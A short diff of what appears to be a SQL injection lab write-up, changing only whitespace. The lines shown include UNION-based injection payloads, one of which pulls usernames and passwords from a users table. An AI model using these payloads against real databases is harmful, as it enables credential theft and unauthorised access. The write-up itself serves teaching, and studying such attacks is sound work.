@@ -9,7 +9,7 @@ Here, The database contains a different table called users, with columns called 
 
 ``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' --  ```
 
-Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.
+Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method. 
 
 ``` SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users -- ```
 
